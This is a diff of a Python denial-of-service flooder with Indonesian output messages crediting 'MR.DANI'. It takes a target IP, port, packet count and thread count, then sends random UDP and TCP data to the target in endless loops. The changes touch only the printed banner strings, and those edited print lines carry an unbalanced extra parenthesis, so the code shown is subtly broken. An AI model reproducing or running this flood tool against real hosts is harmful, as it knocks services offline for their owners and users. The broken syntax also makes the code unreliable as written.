@@ -24,20 +24,20 @@ times = int(input(" PACKETS:"))
 threads = int(input(" ISI PACKETS:"))
 def run():
 	data = random._urandom(1024)
-	i = random.choice(("TOK","TOK","TOK"))
+	i = random.choice(("[Packed]","[Packed]","[Packed]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" PACKET DARI M̴̒͑R̵͑͑.̸̾͘D̴͋͑A̴͆͒N̵͑̓Ḯ̴̐ %s TOK TOK TOK PACKET OTW IP %s DAN MEMBERI PACKET KE PORT%s!!"))
+			print(i +" Tok Tok Tok Packed Dari M̴̒͑R̵͑͑.̸̾͘D̴͋͑A̴͆͒N̵͑̓Ḯ̴̐ Otw"))
 		except:
 			print("[!] Error!!!")
 
 def run2():
 	data = random._urandom(16)
-	i = random.choice(("TOK","TOK","TOK"))
+	i = random.choice(("[Packed]","[Packed]","[Packed]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -45,7 +45,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" PACKET DARI M̴̒͑R̵͑͑.̸̾͘D̴͋͑A̴͆͒N̵͑̓Ḯ̴̐ %s TOK TOK TOK PACKET OTW IP %s DAN MEMBERI PACKET KE PORT%s!!"))
+			print(i +" Tok Tok Tok Packed Dari M̴̒͑R̵͑͑.̸̾͘D̴͋͑A̴͆͒N̵͑̓Ḯ̴̐ Otw"))
 		except:
 			s.close()
 			print("[*] Error")
